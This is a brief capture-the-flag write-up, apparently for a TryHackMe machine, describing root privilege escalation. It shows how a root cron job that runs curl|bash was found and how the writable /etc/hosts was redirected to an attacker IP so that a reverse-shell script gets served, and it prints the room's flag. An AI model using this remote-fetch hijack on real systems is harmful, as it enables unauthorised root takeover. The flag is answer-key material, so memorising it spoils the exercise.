`env` command showed password of another user

```
$ sudo -l
```

revealed we can run /usr/bin/id as sudo i wasted time on trying to ldd hijack but that wasn't it

i pivoted to monitor the running processes using https://github.com/DominicBreuker/pspy

revealed

```
2026/06/02 11:02:01 CMD: UID=0     PID=23671  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
```

the app fetches `mkingdom.thm:85` then simply executes it

exploiting it

```
$ ls -l /etc/hosts
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
```

we can setup domain forwarding and redirect `mkingdom.thm` to attacker controlled server

```console
echo "192.168.247.244 mkingdom.thm" > /etc/hosts
```

create directory `/app/castle/application/counter.sh` on attacker machine and start the server on port 85 with counter.sh containing reverse shell

```console
# chown root /bin/cat
# cat root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
```
